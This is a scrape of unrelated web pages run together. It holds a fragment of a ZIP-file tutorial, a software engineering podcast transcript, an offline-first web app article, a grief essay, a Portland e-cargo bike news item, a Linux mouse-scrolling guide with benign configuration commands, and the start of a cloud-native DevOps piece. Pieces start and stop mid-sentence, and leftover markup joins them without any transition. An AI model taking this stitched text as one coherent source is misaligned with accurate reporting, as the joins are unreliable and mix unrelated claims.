warning [ex.zip]:  zipfile is empty
</pre>
<p>Ok, so we'd actually like to add some files to our archive. Otherwise what's the point?
</p>
<p>Every file we add must be prefixed with a <code>local file header</code> and, after all the files are added, we add a <code>Central Directory</code> record which
contains the locations (offsets) of all those files.
</p>
<p>Firstly let's add the local file header. It needs the length of the file and the length of the file name. No problem.
More difficult is that the header needs the CRC32 checksum of the file (to allow the zip reader to check the integrity of the archive).
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header">https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header</a>
</p>
<p><span>The trailing data descriptor record which can be used to add the CRC32 checksum and file size/compressed size <em>after</em> we've written the file. This can help simplify the zip writer's job. We will not use these here.</span>
</p>
<p>I have a feeling that CRC32 checksums will be difficult. So let's just write a <strong>zero crc32</strong> and see what happens...
</p>
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm">https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm</a>
<p>Call <code>local_file_header</code> for each file we want to add to the zip. I've defined a struct <code>zfile_t</code> to hold the file name and some
other information like it's size and crc32 (set to zero for now). <span>full code linked at the end</span>.

<h2> the central directory</h2>
<p>This record/block contains a list of all the files in the archive (it need not contain all the files we added, nor list them in the same
order; this allows deleting files without rewriting the entire archive, important if you have 10 floppy disks...).
</p>
<p>The central directory doesn't have a separate header. It's not really a record, more a sequence of records, one per file of interest.
These records are similar to the local file header records but have a few extra fields.
</p>
<p>Finally we must remember to update our, <em>now non-empty</em>, EOCD with link back to our central directory record. Until now we were just
writing zero into the EOCD fields [size of central directory] and [offset of central directory].
</p>
<p>We can easily capture the file offset before we start writing the Central Directory and get the size by subtracting it from the file
offset after we have written the Central Directory.

					<div><h2>Transcript: Combatting Tech Debt In War Rooms</h2><p><em>[If you want, you can help make the transcript better, and improve the podcast’s accessibility via&nbsp;</em><a href="https://github.com/mgreiler/se-unlocked/tree/master/Transcripts" target="_blank" rel="noopener">Github</a><em><a href="https://github.com/mgreiler/se-unlocked/tree/master/Transcripts" target="_blank" rel="noopener">.</a>&nbsp;I’m happy to lend a hand to help you get started with pull requests, and open source work.]</em></p><p><strong>Michaela:</strong>&nbsp;[00:00:00] Hello, and welcome did a software engineering unlocked podcast. I’m your host, dr. McKayla. And today I have the pleasure to talk to Thomasz Łakomy.</p><p>But before I start, let me share something fantastic news. The podcast has gotten its first sponsor. I’m so happy about this because it means I can focus even more on producing episodes for you. And it’s not any sponsor. It’s an amazing match. Actually, two founders, Tracy and Dom reached out to me. They are building CodeSubmit, a take home assignment platform to streamline your tech recruiting. They’re already profitable and they are part of the TinySeed Accelerator. The reason for them to build CodeSubmit is because they strongly believe that take home challenges are the most candidate friendly way of assessing developer talent. And they could not find a dedicated tool for them. So they set out to build the best experience for take home assignments for hiring managers and developers. It’s built on Git and they support 64 different languages and frameworks, even though it’s a young startup, and it’s built the Indy Way, they already worked with hundreds of companies. Well, last weekend to show me the whole experience and it’s fantastic. So I really hope you go and check out CodeSubmit. You can find it at&nbsp;<a href="https://codesubmit.io/" rel="nofollow">https://codesubmit.io</a>. And they also offer a free trial. Well, if you like it, please give them some love and social media for sponsoring this episode.</p><p>But now, back to Thomasz. Thomasz is a senior front end engineer at the Alix group, which is a fast-growing platform for trading businesses. Commercial is also an ad hack instructor. He’s certified for AWS and he’s a speaker and blogger. So I’m really happy to have Thomasz here with me, Thomasz, welcome to the show.</p><p><strong>Tomasz:</strong>&nbsp;[00:01:46] Hello, everyone. I’m very happy to be here.</p><p><strong>Michaela:</strong>&nbsp;[00:01:48] So, Thomas, maybe as a start, can you tell me a little bit about your role at Alix group on the website? It says it’s a platform for buying and selling cars, finding housing, getting jobs, buying, and selling household goods. But what are your team’s responsibilities? What are your tasks at this company?</p><p><strong>Tomasz:</strong>&nbsp;[00:02:05] Sure. So, as you’ve mentioned, like basically what we do at Olin’s group is, but we did a huge number of different websites for like buying stuff, selling stuff. So as you mentioned, we have cars, we have real estate, we have goods, we have services. So there’s obviously a lot of things going on. And obviously, you know, my team in particular, like we cannot be responsible for everything. The way we work at all X group is about each team is focused on a certain area of the business and they own it competently. So my team is focused on all the jobs because not only you can bounce stuff, but you can also find a better hopefully job at all X. So what we are building is what we are building solutions. That has people find a, you know, a newer better job in particular, we are working on something that is called a candidate profile, because the idea that we have in mind is about, you know, CVS are kind of outdated because this concept of a CV has been around for, for ages and when we need something better. So not only people can create basically are four fires at all X, but we also are going to use the data in the profile. In order to find people. I bet a job automatically because we send them recommendations based on their profile and also the face on the job ads that were actually, they were going through on the other side. So we are kind of, kind of trying to find a better job for them.</p><p><strong>Michaela:</strong>&nbsp;[00:03:34] Okay. So can I imagine it as like LinkedIn, but a little bit different or is it very different?</p><p><strong>Tomasz:</strong>&nbsp;[00:03:41] Is this somewhat different than LinkedIn? I think LinkedIn has this very, very focused on like white collar jobs. So, you know, white collar, basically what I mean by that is that, you know, you work in the office, you probably have a product to probably have a, you know, a title that is in English and you probably spend your time in front of a computer. And this is not the reality of like, I suppose like majority of people, because people have different careers, people have different skill sets and whatnot. So what we are trying to build is to have a product that is somewhat similar to LinkedIn as a new, create a profile. And you can use it to find a better job, but with a much broader focus. So we are wanting to target basically everyone who is looking for a job in Poland. And also help them find a better job because like not everybody is used to, you know, searching for a job, offer online, not everybody’s student negotiating. So one of the experiments that we’ve had a couple of times, I go, there’s also building a platform in which the employer would have to provide a salary because we also would like to in ideal a scenario, avoid this process of, you know, Whenever you have to negotiate a salary, how much do you want? How much are you willing to give me? How much do you want? And so bucket and so forth.</p><p><strong>Michaela:</strong>&nbsp;[00:05:02] Yeah, for me, it’s always mind blowing that, you know, I, to be honest, I haven’t known about all ex before. Right. And so for this podcast, I researched it a little bit and I went on the website and I see like this large numbers of employees that you have. And then I went to the career side and I see, wow. There, I think if I, on the top of my head, I think there were like 16 open positions in data analysis or data engineering, something like this. Right. Then there were like 80 positions for engineers. Right. And I was like, Wow, because I worked as a data scientist or like a researcher before. Right. And sometimes struggling, like where are the companies that actually hiring, you know, people with these skillsets and then you’re stumbling across a company that you never heard of anything like, well, this is not a small company. It’s a large corporation, right. That you’re actually working for. And so, yeah, maybe what would be interesting for me is like, well, you said my team, right? So my team, and then you’re working with data scientists. What are other engineers that you’re working with? Right. You’re a front-end engineer. So who is on your team? You know, do you have like testers on your team? Do you have like designers on your team and, and then you’re working with data scientists. How does the communication work like this? Can you tell me a little bit about the structure and you know, how, how are teams collaborating at all X.</p><p><strong>Tomasz:</strong>&nbsp;[00:06:13] Sure. So the way we kind of work at all X or X group is, but each team is a park. So we are defined the divided into something that is called a park and a park is this like self-contained unit of the organization that can ship their staff to the production. So each park has, you know, If you need front-end engineers, you have a front end engineer, you have buckets, engineers you’ll have product managers. There’s usually an engineering manager. If there are no engineers on the team, that’s kind of all, it is also useful. Some teams have a dedicated designer, some teams are working closely with, you know, with the designers, but they’re not necessarily in that team because some teams have like different needs when it comes to things like design. We also have a business analyst in our team. So again, like this is a very kind of self contained unit. What I like about this setup is because I used to work in the companies where we have, we had a front-end department and we had a backend and not only was communication tricky, but also working in an actual AI way was some somewhat difficult because as a front end engineer, if I wanted to get, by the way, I would like to get this one more piece of data from the backend. Then you had to go do the backend team, talk to them, but they apparently have the authority for this, for this space. I have to wait for the next bit and whatnot. Whereas in our current setup, we’ve worked very closely together. So we are not working in a silo, but quite the contrary, we are working very closely together with backend engineers, front end engineers. All of those skill sets that are required to build amazing products. Everything is included in that team. And I are very proud as a front end engineer of our backend engineers, because there are actually submitting a feedback when it comes to design and when it comes to UX solution that we build it. So this is honestly, this is something that I haven’t seen before then. Just the level of commitment to building. Uh, great products and not only, you know, juggling Jason data, as some of buckets engineers are used to doing.</p><p><strong>Michaela:</strong>&nbsp;[00:08:23] Okay. Yeah. And so how many front end engineers are, for example, in your team, but</p><p><strong>Tomasz:</strong>&nbsp;[00:08:29] those themes, they don’t have to be very large. So in my thing currently, we have two trumpet engineers. There’s two backend engineers. We have a dedicated contact in the data science team. So he’s not technically in our team, but we are working very closely together. We also have a dedicated designer, a product manager, business analyst, and my engineer manager. So there’s less than 10 people in total. I like this role that each team should be large enough that a one pizza can fit the entire theme. And I think this is not a good metric for how large the teams should be. Yeah, I like that.</p><p><strong>Michaela:</strong>&nbsp;[00:09:07] But with 10 people and one pizza, I mean, everybody gets a little slice. Really?</p><p><strong>Tomasz:</strong>&nbsp;[00:09:14] Yeah.</p><p><strong>Michaela:</strong>&nbsp;[00:09:15] Yeah. And so one of the things that I love is code reviews. And so if you have like two front end engineers, do you do code reviews for each other? Or do you have like the back end engineers also looking at your code? …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393390920/_sH5RujzQ.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Most web application developers reach for the tried and tested approach of fetching data from their API right when they need it, and they don't give an offline-first approach the consideration it deserves. Perhaps that's because working offline is generally thought of as a specific feature and that it's not necessarily applicable or appropriate for a wide variety of applications. However, there's a lot to be gained from going offline-first, even if your app isn't the "typical" offline application. Hopefully, after reading this article, you'll feel like you're better equipped to answer if working offline-first is right for your app.</p>

<p>When we say "offline-first", we don't just mean a bit of caching that means your user can revisit some pages they've already seen before. Many web apps make heavy use of the browser cache to achieve some basic level of functioning without a working internet connection. We're talking about going well beyond that.</p>
<p>For us, an offline-first web application is an application that is designed to be (close to) fully-functional without an internet connection. Now of course, the application may need an internet connection the first time around to authenticate the user and download some data. However, after that initial sync, it should be able to function without internet connectivity for some period of time. This means that not only browsing data (i.e. read operations) should work, but the user should also be able to create and update data (i.e. write operations) while in a disconnected state.</p>
<p>There are a million and one ways to achieve this kind of offline-first functionality. There's the browser cache, service workers, local storage, IndexedDB and a myriad of other tools that can be brought together to give your users a brilliant offline experience. </p>
<p>Inspired by the offline-first tools we use every day like Superhuman, Figma and Pitch, we've recently been working hard to turn <a target="_blank" href="https://kitemaker.co/">Kitemaker</a>, our product management tool for cross-functional, self-organizing product teams, into an offline-first application. We fetch the data the user may need ahead of time and store it in a local cache. The web application itself operates on that local cache only, and a separate layer takes care of syncing those changes back to the server. Our design was heavily inspired by the work Evan Wallace published about <a target="_blank" href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/">how multiplayer behavior works in Figma</a>. We're currently working on using service workers to download static assets and using IndexedDB to back our cache with persistent storage. We'll do a follow-up blog post on how offline works in Kitemaker, but here's a quick peek at the architecture:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393439657/Q9T8clsHl.png?auto=format&amp;q=60" alt="offline_architecture.png"></p>
<p>But this is just one example of how to achieve offline functionality. Exactly how you solve it will depend heavily on your application. The important part is that you start to think about whether your app <em>should</em> be offline-first.</p>

<p>You may be thinking that offline functionality sounds nice, but isn't super relevant most applications. We tend to disagree. We think there is a trend to push more and more SaaS products towards supporting working offline, and we think this is absolutely the right idea.</p>
<ul>
<li>Is your application's performance (how fast it responds to your users' inputs) important/critical?</li>
<li>Will your users be using your application in areas with spotty connectivity?</li>
<li>Will your users by using your application on airplanes?</li>
<li>Will your users be using your application when roaming on their data connections, such as when on vacation?</li>
</ul>
<p>We'd be surprised if you didn't answer "yes" to at least a couple of those questions.</p>

<p>There are a bunch of advantages that come along with making your application offline-first:</p>
<ul>
<li><strong>It'll work offline.</strong> Yep, that's right. If you make your application work offline, it will in fact work offline 😊 It's actually a pretty killer feature and one which we appreciate greatly, especially when traveling/commuting.</li>
<li><strong>It'll survive flaky networks.</strong> There's nothing worse than getting an error on a web application just because your network had a hiccup. We really wish more chat applications (you know who you are) worked offline-first to avoid bad behavior on bad networks.</li>
<li><strong>It'll make your application react quicker to your users' inputs.</strong> Instead of waiting for a server roundtrip to update a UI, offline-first applications can behave optimistically and update local data right away and then send off changes to the server. This means your users don't need to wait around for the response.</li>
<li><strong>It sets you up nicely for "multiplayer" behavior.</strong> In order to make your application work offline, you  need to be able to handle conflicts that might arise when your users come back online and start shipping queued changes to your servers. Handling these queued operations is very often the same type of logic that's needed to handle two users operating on the same data at the same time, which means you might be able to unlock more collaborative features of your application.</li>
<li><strong>It can help you scale your writes on your server.</strong> Because your users aren't waiting around for responses from the server, you can treat your writes a bit differently. Maybe you queue them up for processing, or adopt a <a target="_blank" href="https://www.martinfowler.com/bliki/CQRS.html">CQRS</a> and <a target="_blank" href="https://www.martinfowler.com/eaaDev/EventSourcing.html">event sourcing</a> approach. It opens up all sorts of possibilities.</li>
<li><strong>It can simplify your app logic.</strong> For us in Kitemaker, this was a big one. Before we adopted this offline-first approach, our GraphQL API calls had wormed their way into our code in a lot of places. Whenever changing data, we had to set up a GraphQL mutation, handle the response, provide optimistic responses to get the performance we need, etc. It was messy and complex. Now we just operate on objects in our local cache and the changes are transparently synced to our backend (and onwards to other users).</li>
<li><strong>It can simplify your backend API.</strong> This one is not guaranteed by any means, but for us, our backend API became a very simple thing indeed. Instead of create/update/delete endpoints (or in our case mutations since we use GraphQL) for all of the different resources in our system, we now have a really simple API for sending changes from the client to the server. That's it. Of course YMMV.</li>
</ul>

<p>While there are numerous advantages to working in an offline-first, it's not a given that you should dive in right away. Think about these things a little first:</p>
<ul>
<li>Is the data your users need to interact with reasonable small or can you chunk it into smaller datasets that your users can selectively choose to download for offline use (e.g. restaurant recommendations for a particular country/city)? If not, it will be very hard to build a good offline experience.</li>
<li>Can you ensure that most operations that your users perform while offline will succeed? Being offline-first does not lend itself to applications where your users will frequently get their requests rejected, transactions will be get rolled back, etc. Basically you need to ensure you have a very simple and deterministic way to handle any conflicts that might occur. If you can't ensure this, you'd better think twice before digging in.</li>
<li>It can be <em>a lot</em> of work to get it right. There are tools out there to help you, but you won't get offline-first behavior for free. You need to decide if it's worth the investment for your product or not.</li>
</ul>

<p>We hope this article got your gears turning a little when it comes to offline-first web applications. We don't think appropriate for every application - it can be quite a lot of work to get right and for some applications it just doesn't make a lot of sense. But we just think people should give it some thought when designing and architecting a new application. We've learned from experience that retrofitting this type of behavior can also be quite a lot of work, but we're super happy we did it nonetheless!</p>

I was fortunate to be by her bedside in the last few days of her life. At the beginning she was lucid and we got to say good bye— a great privilege. Then, for days, I watched her struggle for every breath as her breathing got shallower and shallower, until it eventually stopped.</p><p>Watching your parent die momentarily changes your executive depth of field. Important aspects of life near the foreground and assume unprecedented sharpness; unimportant ones recede and blur with the background. What matters and what doesn't becomes exceptionally obvious. For a moment, there is no mistaking one for the other.</p><p>In her last days, my mom had the long view on her life. Our conversations were emotional, but in part they sounded like a strategic postmortem, the way one might analyze key moments of a football game. Much of what she recalled was surprising— details that must have been mundane at the time, but turned out to have crucial importance to her in the end.</p><p>I wanted to write the lessons that seemed obvious to me while I was with her before they fade from memory. This is my writing and my view.  If my mom wrote this, the list would have been different. In all likelihood, she would have disagreed with many of my conclusions. Most of them contradict each other anyway. Caveat emptor.</p><ul><li><p>At the end, you will care about 3-5 things.</p></li><li><p>Your relationship with your parents, your spouse, and your children will be on that list. Get as many of these right as you can.</p></li><li><p>You can't know everything you will care about, but you can introspect the most important things. Do that early.</p></li><li><p>Always keep them in mind. Write them down. Review them daily. This is your North Star.</p></li><li><p>Declare bankruptcy on bullshit— faux emergencies, manufactured glitter, family and relationship drama, pointless errands, gossip, events you can't control, judgement of strangers, the opinion of Jeremiahs. My god, what an exhausting waste of time! Let it all go.</p></li><li><p>Every time you do something that you regret later, write it down. Then do those things less.</p></li><li><p>There will be times when you will have to be ruthless. When those times come, do not flinch.

Eat good food, exercise, attend to medical needs when it becomes necessary.</p></li><li><p>Get off the internet.</p></li><li><p>Cultivate a reading habit, and read widely. Reading broadens the imagination and expands the space of possibilities. It's a way out of the prison of your circumstance available to almost anyone who wants it.</p></li><li><p>Do more. Don't wake up one day thinking you haven't done all you could.</p></li><li><p>Have faith that the powers of darkness will, in time, <a href="https://gist.github.com/coffeemug/bad367b8edfc189a337bbf691b8fcb32">be crushed by the spirit of light</a>.</p></li><li><p>Seek  advice, but don't outsource your decisions. No one can make them for you.</p></li><li><p>Make a list of people you want to impress. Keep it very short. Be sure these people have your best interests at heart. Then ignore judgement from anyone not on the list.</p></li><li><p>Learn to think for yourself. The best way is to be around someone who can already do that. The second best way is to read correspondence of inventors, scientists, mathematicians, and artists. Third best is to read biographies. Ideally, do all three.</p></li><li><p>Examine your circumstance every few months. If something makes you unhappy for too long, make a change. Don't live a life of quiet desperation.</p></li><li><p>Strive for excellence, not greatness. <em>(thanks Robert!)</em></p></li><li><p>The hardest battles are the ones you’ll fight with yourself.</p></li><li><p>Accept people as facts.</p></li><li><p>Every time you do something you don't want to do, but are happy about it later, write it down. Do those things more.</p></li><li><p>Have adventures that carry risk. Start a business, ask out the girl you like, climb a mountain. This is where you'll find the 3-5 things that matter.</p></li><li><p>Have children.</p></li><li><p>Cultivate a sense of humor in all things. Prefer comedy over tragedy.</p></li></ul><p>My mom’s last words to me before she fell asleep and never woke up:</p><blockquote><p>Wear warm clothes. There is apple strudel for you on the kitchen table. Be strong.</p></blockquote><p>I’ll miss you every day, mom ❤️</p></div></div>]]>

<p>Employees in Portland, Oregon’s parks bureau&nbsp;will have a new way to get to the trails they maintain in the coming months, riding out on an electric-assist cargo bike with enough&nbsp;storage space to handle trash and debris.</p><p>The three-wheel bike, designed specifically for use by municipal employees, is being provided to the city for free by distributor <a href="https://www.sarisinfrastructure.com/" target="_blank">Saris Infrastructure</a> as part of a&nbsp;pilot program to test the vehicles’ capabilities in various city tasks.&nbsp;</p><p>The <a href="https://www.urbanarrow.com/en/tender" target="_blank">cargo bike</a>, manufactured by Amsterdam-based <a href="https://www.urbanarrow.com/en" target="_blank">Urban Arrow</a>, can carry a maximum of 881 pounds (rider and payload) and has a 250-watt engine. The model can be made in a number of different configurations, including a flatbed, a pick-up and several different cargo boxes, including one that’s temperature-controlled. The bike has zero emissions and can “effectively supplement the standard city fleet offerings of a single-occupant car or a light-duty truck,” according to Saris.</p><p>“We didn’t want this to be just a novelty,” Mike Basarich, director of Saris Infrastructure, said in a statement. In addition to its hauling capabilities, he added, the bike “is healthier for employees and potentially much more efficient—no more fighting for parking spaces or adding to congestion.”</p><p>Saris, the manufacturer’s North American distributor, had originally offered the bike to Portland’s Bureau of Transportation, which had intended to use it in the summer for deliveries to businesses that obtained permits to operate in the streets during the Covid-19 pandemic.&nbsp;</p><p>“But the timing didn't work out,” said Dylan Rivera, a spokesman for the transportation bureau. “But we thought it could potentially be a really useful resource, so our staff kept it in mind and spread the word to our colleagues, and the parks staff felt like they had a specific need they could fulfill, potentially, with this.”</p><p>The bike will be used for trail maintenance in at least one location, including trash and debris clean-up, but could expand to others during the pilot program, said Mark Ross, spokesman for the city’s parks bureau. The city is expected to use the bike for up to four months.</p><p>Portland is the second city to pilot the bikes, following an ongoing program in Madison, Wisconsin, where Saris is headquartered. The program there began last summer in the city’s Fleet Services department, which used the bikes to move parts between locations. Later, employees in the engineering department’s greenway vegetation program used the bikes as well, hauling equipment and brush from vegetation maintenance along bike paths, ponds and greenways.</p><figure><img alt="" height="254" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/12/03/city_employee_removedjapanesehedgeparsley_swpath.jpeg" width="370">

</figure><p>“Covid safety restrictions have eliminated vehicle sharing, so the cargo bike has the added bonus of allowing us to get an employee to a site with needed tools and equipment without having to use a personal vehicle,” Madeline Dumas, the city’s greenway vegetation coordinator, said in a statement.</p><p>Participants in the pilot program track the miles they ride and answer short surveys about the experience of doing their jobs by bike, information that will be used by Saris to “better actualize how they can be used” by cities around the country.</p><p>The pilot will be the second in Portland to use e-cargo bikes, following a partnership <a href="https://www.freightwaves.com/news/ups-portland-team-up-on-e-bike-delivery-pilot" target="_blank">last year</a> that replaced a UPS delivery truck in a university district with one of the cycles. Rivera said the technology makes sense for Portland, an extremely bike-friendly city with the goal of reaching net-zero carbon emissions in the next 30 years.</p><p>“We certainly are interested in any way we can continue to try to lower our carbon emissions and reach other sustainability goals for the city,” he said.<svg>

  <h2>Pixel-Perfect Scrolling With a Mouse Wheel Under Linux</h2>
  <time datetime="2020-01-21T00:00:00+00:00">21 Jan 2020</time>
  <p>Yesterday, I plugged in my Logitech mouse into my laptop and started reading a PDF file. I started scrolling the page and realized that the scrolling is not as smooth as with my touchpad. The difference is that the touchpad scrolls the PDF pixel-by-pixel, whereas my mouse scrolls the PDF with one scroll-wheel click roughly 3 lines at once.</p>

<p>I previously had a look into the HID++ protocol of Logitech mice to <a href="https://github.com/fin-ger/logitech-m720-config">enable the thumb button of my M720</a>, and did know that my mouse has a high-resolution mode for the scroll-wheel. So, technically it is possible to get high-resolution scrolling data from my mouse and translate it to smooth pixel-perfect scrolling in my PDF viewer.</p>

<p>I searched the internet, read systemd source code, dug into libinput documentation, and finally found a way to achieve pixel-perfect scrolling! 🎉</p>

<h2 id="here-is-how-to-set-it-up">Here is how to set it up!</h2>

<p>First you have to install the <code>solaar</code> package with your Linux distribution’s package manager.</p>

<ul>
  <li><a href="https://packages.debian.org/sid/solaar">Debian</a></li>
  <li><a href="https://packages.ubuntu.com/eoan/solaar">Ubuntu</a></li>
  <li><a href="https://apps.fedoraproject.org/packages/solaar">Fedora</a></li>
  <li><a href="https://packages.gentoo.org/packages/app-misc/solaar">Gentoo</a></li>
  <li><a href="https://www.archlinux.org/packages/community/any/solaar/">Arch</a></li>
  <li><a href="http://madb.mageia.org/package/show/release/cauldron/application/0/name/solaar">Mageia</a></li>
  <li><a href="http://software.opensuse.org/package/Solaar">OpenSUSE</a></li>
</ul>

<p>After installing, follow the wizard to configure your unifying receiver and mouse. Now, you can use <code>Solaar</code> to configure some options on your mouse. The <code>Wheel Resolution</code> property enables the high-resolution mode on the mouse-wheel.</p>

<p><img src="https://blog.made-by-fin.de/assets/solaar-config.png" alt="Solaar configuration window"></p>

<blockquote>
  <p>Unfortunately, the wheel resolution property is not working with all unifying receivers. If it is not working, you can try restarting and disconnecting and reconnecting the unifying receiver to see if it works then, but some receivers of mine were no able to set the property. The receiver with <code>Bootloader 34.00.B0004</code> and <code>Firmware 04.02.B0009</code> worked best for me.</p>
</blockquote>

<p>Alternatively, you can try to set the property via the command line:</p>

<div><div><pre><code><span>$ </span>solaar config <span>"M720 Triathlon"</span> hires-smooth-resolution <span>true</span>
</code></pre></div></div>

<p>If the <code>Wheel Resolution</code> property could be successfully set, you will recognize way too fast scrolling behavior. This can be changed by applying some <code>udev</code> <code>uwdb</code> rules.</p>

<p>Create the file <code>/etc/udev/hwdb.d/71-logitech-m720.hwdb</code> as <strong>root</strong> and open it in your preferred editor (also as root or with sudo). Insert the following lines and save the file.</p>

<div><div><pre><code>mouse:usb:v046dp405e:name:Logitech M720 Triathlon:
mouse:bluetooth:v046dpb015:name:M720 Triathlon:
    <span>MOUSE_WHEEL_CLICK_ANGLE</span><span>=</span>1
    <span>MOUSE_WHEEL_CLICK_COUNT</span><span>=</span>360
</code></pre></div></div>

<p>Documentation on all available options for your mouse can be found <a href="https://github.com/systemd/systemd/blob/05de16766b6bae290c500857269b753df2a0c649/hwdb.d/70-mouse.hwdb">here</a>. A more up-to-date version may be available <a href="https://github.com/systemd/systemd/blob/master/hwdb.d/70-mouse.hwdb">here</a> (might be broken in the future).</p>

<p>Next, we have to apply the changes. Run the following commands:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>udevadm hwdb <span>--update</span>
<span>$ </span>libinput list-devices | <span>grep</span> <span>-A</span> 1 M720
Device:           Logitech M720 Triathlon
Kernel:           /dev/input/event15
<span>$ </span><span>sudo </span>udevadm trigger /dev/input/event15
</code></pre></div></div>

<blockquote>
  <p>Replace <code>/dev/input/event15</code> with the result shown by `libinput list-devices**</p>
</blockquote>

<p><strong>Congratulations!</strong></p>

<p>You got pixel-perfect scrolling with your mouse-wheel!</p>

<video width="1000" controls="">
  <source src="https://blog.made-by-fin.de/assets/m720.mp4" type="video/mp4">
</video>

<blockquote>
  <p>A before/after comparison of the proposed configuration</p>
</blockquote>

<h2 id="persisting-the-configuration">Persisting the Configuration</h2>

<p>The <code>hwdb</code> configuration will be automatically loaded when you plug in your mouse. The <code>Wheel Resolution</code> property is sometimes restored by Solaar, and sometimes not. Try to put Solaar in the autostart of your desktop environment. It might work. Otherwise, you have to manually enable the property 😢</p>

<h2 id="enhancements-and-future-work">Enhancements and Future Work</h2>

<p>The scrolling can stutter or jump when scrolling really slow. Also, when the middle mouse button is clicked you may unintentionally scroll, as the sensitivity of the scroll-wheel is so high. Maybe, this can be solved by applying a filter with libinput on the incoming scroll events. I have not figured out, how to set this up, yet.</p>

<p>DevOps, the method of <strong>automating processes between development and operations</strong>, is one of the essential factors of successfully implementing a cloud-native approach. Since cloud-native has a purpose to<strong> reduce go-to-market time and bring more efficiency to companies</strong>, DevOps is what streamlines individuals, tools, and systems, contributing to the overall success of the enterprise. This is what makes cloud-native DevOps a logical step towards improved productivity.&nbsp;</p>



<p>Both cloud-native and DevOps movements are on the rise. <a rel="noreferrer noopener" href="https://www.reportsanddata.com/report-detail/devops-market#:~:text=The%20global%20DevOps%20Market%20is,USD%2017.27%20Billion%20in%202027." target="_blank">Reports and Data</a> predict that <em>the global DevOps market will grow from $4.49 billion in 2019 to $17.27 billion in 2027</em>.&nbsp;</p>



<p>What is more, <a rel="noreferrer noopener" href="https://microtica.com/devops-covid-19-pandemic/" target="_blank">the COVID-19 pandemic significantly influenced cloud adoption</a>. <a href="https://www.techrepublic.com/article/idc-worldwide-it-predictions-for-2021-that-cios-need-to-know/#:~:text=There%20will%20be%20a%20dramatic,affect%20the%20enterprise%20by%202023.">Predictions</a> say that by the end of 2021, <strong>80% of companies will double the adoption of cloud-centric infrastructure and apps</strong>. This is mainly due to the shift to a remote-first workforce.&nbsp;&nbsp;</p>



<p>A cloud-native DevOps approach maximizes agility with continuous deployment. Moreover, it scales up systems and applications without the need for drastic changes.</p>



<p><em>Let’s dive in and see what this approach really means.&nbsp;</em></p>



<h2>What is the cloud-native approach to software development?&nbsp;</h2>



<p>Adopting the cloud-native approach means embracing many new options for leveraging innovations. <em>The primary tools cloud-native teams use are offered by the cloud instead of on-premise infrastructure.&nbsp;</em></p>



<p>Cloud-native applications are <strong>agile, adaptable, robust, and easy to monitor.</strong> This means that teams build them with frequent and quick deployments and iterations. Instead of preventing failure, they embrace it and have <strong>the ability to improve in real-time</strong>. </p>



<p>Furthermore, they don’t rely on external factors when it comes to monitoring. Instead, the application can be controlled from the inside.&nbsp;</p>



<p>The cloud-native beginnings date from around ten years ago, when a group of tech leaders introduced it to the public. <a href="http://pzf.fremantle.org/2010/05/cloud-native.html" target="_blank" rel="noreferrer noopener">This blog post</a> by Paul Fremantle,  VP of Technical Product Strategy at Weaveworks, is among the first related articles. In the post, he claims that applications should be written FOR the cloud to behave well ON the cloud.&nbsp;</p>



<p>Then, in 2015, Matt Stine, Executive Director at JPMorgan Chase, cleared the cloud-native concept in his book <a href="https://www.oreilly.com/library/view/migrating-to-cloud-native/9781492047605/" target="_blank" rel="noreferrer noopener"><em>Migrating to Cloud-Native Application Architectures</em></a><em>.&nbsp;</em></p>



<p>Now,<strong> the cloud-native umbrella covers many tools and methods, including microservices, containers, CI/CD, multi-cloud</strong>, etc. <a href="https://landscape.cncf.io/" target="_blank" rel="noreferrer noopener">The CNCF Cloud Native Interactive Landscape</a> provides a great overview of most of the tools used in the cloud-native approach.&nbsp; To help and provide development communities with good alternatives for building cloud-native applications, the CNCF cultivates this landscape of open source tools.</p>



<h2>What is cloud-native DevOps?&nbsp;</h2>



<p>If we combine the two definitions, cloud-native DevOps turns into <strong>a set of practices that consists of constant development, automated actions, and cross-functional teams,</strong> which result in improving the entire experience of the end-user. Cloud-native DevOps is all about <strong>making your company more flexible.</strong> You achieve this through technologies like Kubernetes and containers, which can automate processes and make applications more scalable.&nbsp;</p>



<p>All these practices apply to almost every aspect of the company. This means changing the entire culture which involves tools, people, and processes. When it comes to <strong>culture, </strong>you need to <a href="https://microtica.com/want-to-move-from-ops-to-devops-here-is-what-you-should-know/" target="_blank" rel="noreferrer noopener">adopt a DevOps-oriented approach</a>. This will foster better alignment between people and tools. </p>



<p>You have to motivate your employees to collaborate more effectively, encouraging a faster feedback circle. Faster feedback will enable quick iterations and real-time improvements. </p>



<p>You’ll also have to make some <strong>technical changes</strong>. This refers to adopting technologies that are in the center of cloud-native DevOps, such as containerization and microservices.&nbsp;</p>

<h2>How to get started with cloud-native DevOps?&nbsp;</h2>



<p>These are the options to get started with a cloud-native strategy:&nbsp;</p>



<ol><li>Implementing a cloud-first strategy by choosing a cloud provider instead of an on-premises one</li><li>Adopting a multi-cloud strategy if it meets business needs more closely</li><li>Embracing DevOps, which is obviously what we’re going to focus on further in this post.&nbsp;</li></ol>



<p>When companies realize that agile development requires both automation and culture transformation to produce quality applications faster, DevOps becomes a priority. Handling multiple hybrid environments or streamlining infrastructure stuff can get very complicated. That’s why the popularity of tools that align cloud-native and DevOps processes is rising rapidly.&nbsp;</p>



<p>To make the implementation of cloud-native DevOps easier, these are some things you should pay attention to:&nbsp;</p>



